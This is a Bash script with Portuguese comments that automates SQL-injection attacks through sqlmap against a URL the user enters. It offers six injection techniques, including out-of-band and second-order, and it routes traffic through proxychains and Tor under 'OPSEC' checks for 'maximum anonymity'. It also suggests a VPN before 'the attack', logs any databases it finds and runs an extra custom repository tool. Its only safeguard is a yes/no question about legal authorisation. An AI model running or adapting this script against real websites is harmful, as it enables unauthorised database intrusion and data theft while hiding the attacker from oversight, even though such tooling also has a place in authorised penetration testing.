#!/bin/bash
# SQL Injection Automation Script
# Foco: Máximo anonimato, logs, relatórios, integração com Kali e scripts do repositório

# Garante diretórios antes de qualquer uso
BASE_DIR="$(dirname \"$(realpath \"$0\")\")"
RESULT_DIR="$BASE_DIR/result"
LOG_DIR="$RESULT_DIR/logs"
RELATORIO_DIR="$RESULT_DIR/relatorio"
RELATORIO_FILE="$RELATORIO_DIR/relatorio_$(date +%Y%m%d_%H%M%S).txt"

mkdir -p "$RESULT_DIR" "$LOG_DIR" "$RELATORIO_DIR"

# Checa se sqlmap está instalado
command -v sqlmap >/dev/null 2>&1 || {
   echo "[ERRO] sqlmap não encontrado no sistema." | tee -a "$LOG_DIR/error.log"
   exit 1
}

# Função para checar root
check_root() {
    if [ "$EUID" -ne 0 ]; then
        echo "[ERRO] Rode como root!" | tee -a "$LOG_DIR/error.log"
        exit 1
    fi
}

# Função para OPSEC básica
opsec_check() {
    echo "[OPSEC] Checando anonimato..." | tee -a "$LOG_DIR/opsec.log"
    if command -v proxychains4 >/dev/null 2>&1; then
        echo "[OPSEC] Proxychains encontrado. Usando proxychains para anonimato." | tee -a "$LOG_DIR/opsec.log"
        PROXY="proxychains4"
    else
        echo "[OPSEC] Proxychains NÃO encontrado. Recomenda-se instalar e configurar para anonimato." | tee -a "$LOG_DIR/opsec.log"
        PROXY=""
    fi
    if command -v tor >/dev/null 2>&1; then
        echo "[OPSEC] Tor encontrado. Certifique-se que está rodando." | tee -a "$LOG_DIR/opsec.log"
    else
        echo "[OPSEC] Tor NÃO encontrado. Recomenda-se instalar para anonimato." | tee -a "$LOG_DIR/opsec.log"
    fi
    echo "[OPSEC] Recomenda-se uso de VPN antes de iniciar o ataque." | tee -a "$LOG_DIR/opsec.log"
}

# Função para imprimir mensagens coloridas
print_color() {
    local color=$1; shift
    case $color in
        red) tput setaf 1;;
        green) tput setaf 2;;
        yellow) tput setaf 3;;
        blue) tput setaf 4;;
        magenta) tput setaf 5;;
        cyan) tput setaf 6;;
        *) tput sgr0;;
    esac
    echo "$@"
    tput sgr0
}

# Checagens essenciais ANTES de qualquer input
check_root
opsec_check

# Pergunta sobre autorização legal
read -p "Você tem autorização legal para realizar este teste? (s/n): " AUTORIZACAO
if [[ ! "$AUTORIZACAO" =~ ^[sS]$ ]]; then
    echo "[ERRO] Autorização legal é obrigatória. Abortando." | tee -a "$LOG_DIR/error.log"
    exit 1
fi

# Pergunta nome do operador
read -p "Digite o nome do operador: " OPERADOR

# Salva informações iniciais no relatório
{
echo "Relatório de SQL Injection"
echo "Data: $(date)"
echo "Operador: $OPERADOR"
echo "Autorização legal: SIM"
echo "----------------------------------------"
} > "$RELATORIO_FILE"

# Função para executar sqlmap
run_sqlmap() {
    local url="$1"
    local mode="$2"
    local extra="$3"
    local log="$LOG_DIR/sqlmap_${mode}.log"
    echo "[+] Rodando sqlmap ($mode) em $url" | tee -a "$RELATORIO_FILE"
    if [ -z "$PROXY" ]; then
        echo "[AVISO] PROXY desativado." | tee -a "$LOG_DIR/opsec.log"
        sqlmap -u "$url" $extra --batch --output-dir="$RESULT_DIR" | tee -a "$log"
    else
        $PROXY sqlmap -u "$url" $extra --batch --output-dir="$RESULT_DIR" | tee -a "$log"
    fi
    if grep -iq "available databases" "$log"; then
        echo "[SUCESSO] $mode: Bancos de dados encontrados!" | tee -a "$RELATORIO_FILE"
        grep -i "available databases" -A 10 "$log" | tee -a "$RELATORIO_FILE"
    elif grep -iq "not injectable" "$log"; then
        echo "[FALHA] $mode: Não injetável." | tee -a "$RELATORIO_FILE"
    else
        echo "[INFO] $mode: Verifique o log para detalhes." | tee -a "$RELATORIO_FILE"
    fi
}

# Função para executar outros scripts do repositório (exemplo)
run_custom_scripts() {
    CUSTOM="$BASE_DIR/../Ferramentas/SQLCustomTool/sql_custom.sh"
    if [ -f "$CUSTOM" ]; then
        echo "[+] Rodando SQLCustomTool" | tee -a "$RELATORIO_FILE"
        if [ -z "$PROXY" ]; then
            bash "$CUSTOM" | tee -a "$LOG_DIR/sqlcustom.log"
        else
            $PROXY bash "$CUSTOM" | tee -a "$LOG_DIR/sqlcustom.log"
        fi
    fi
}

# Checagem de permissões de escrita
for dir in "$RESULT_DIR" "$LOG_DIR" "$RELATORIO_DIR"; do
    if [ ! -w "$dir" ]; then
        print_color red "[ERRO] Sem permissão de escrita em $dir. Abortando."
        exit 1
    fi
    done

# Checagem real do serviço Tor
if command -v systemctl >/dev/null 2>&1; then
    if systemctl is-active --quiet tor; then
        print_color green "[OPSEC] Tor está rodando."
        echo "[OPSEC] Tor está rodando." | tee -a "$LOG_DIR/opsec.log"
    else
        print_color yellow "[OPSEC] Tor NÃO está rodando!"
        echo "[OPSEC] Tor NÃO está rodando!" | tee -a "$LOG_DIR/opsec.log"
    fi
fi

# Entrada do alvo
read -p "Digite a URL vulnerável para testar SQLi: " TARGET_URL
TARGET_URL=$(echo "$TARGET_URL" | xargs)
if [[ -z "$TARGET_URL" ]]; then
    echo "[ERRO] URL inválida." | tee -a "$LOG_DIR/error.log"
    exit 1
fi

# Menu interativo de técnicas
while true; do
    echo "Escolha as técnicas de SQLi a serem testadas (separe por espaço):"
    echo "1) Error-Based"
    echo "2) Union-Based"
    echo "3) Boolean-Based"
    echo "4) Time-Based"
    echo "5) OOB"
    echo "6) Second-Order"
    read -p "Digite os números das técnicas (ex: 1 2 3): " TECNICAS
    # Validação rígida: só aceita 1-6
    TECNICAS_VALIDAS=""
    for t in $TECNICAS; do
        if [[ "$t" =~ ^[1-6]$ ]] && [[ ! " $TECNICAS_VALIDAS " =~ " $t " ]]; then
            TECNICAS_VALIDAS+="$t "
        else
            print_color yellow "[AVISO] Técnica inválida ou repetida ignorada: $t"
        fi
    done
    if [[ -n "$TECNICAS_VALIDAS" ]]; then
        break
    else
        print_color red "Nenhuma técnica válida selecionada. Tente novamente."
    fi
    done

declare -A TECNICA_STATUS
for t in $TECNICAS_VALIDAS; do
    case $t in
        1)
            run_sqlmap "$TARGET_URL" "error-based" "--technique=E" && TECNICA_STATUS[Error-Based]="Executada"
            ;;
        2)
            run_sqlmap "$TARGET_URL" "union-based" "--technique=U" && TECNICA_STATUS[Union-Based]="Executada"
            ;;
        3)
            run_sqlmap "$TARGET_URL" "boolean-based" "--technique=B" && TECNICA_STATUS[Boolean-Based]="Executada"
            ;;
        4)
            run_sqlmap "$TARGET_URL" "time-based" "--technique=T" && TECNICA_STATUS[Time-Based]="Executada"
            ;;
        5)
            run_sqlmap "$TARGET_URL" "oob" "--technique=O" && TECNICA_STATUS[OOB]="Executada"
            ;;
        6)
            read -p "Digite a URL de segunda ordem (ou deixe vazio): " SECOND_URL
            SECOND_URL=$(echo "$SECOND_URL" | xargs)
            if [ -n "$SECOND_URL" ]; then
                run_sqlmap "$TARGET_URL" "second-order" "--second-order=$SECOND_URL" && TECNICA_STATUS[Second-Order]="Executada"
            else
                print_color yellow "[INFO] Técnica second-order ignorada (sem URL)."
                echo "[INFO] Técnica second-order ignorada (sem URL)." | tee -a "$RELATORIO_FILE"
            fi
            ;;
    esac
done

# Resumo final no relatório
echo "\nResumo das técnicas executadas:" | tee -a "$RELATORIO_FILE"
for k in "${!TECNICA_STATUS[@]}"; do
    echo "- $k: ${TECNICA_STATUS[$k]}" | tee -a "$RELATORIO_FILE"
done

# Rodar scripts customizados do repositório
run_custom_scripts

echo "[+] Ataques finalizados. Resultados e logs em $RESULT_DIR" | tee -a "$RELATORIO_FILE"
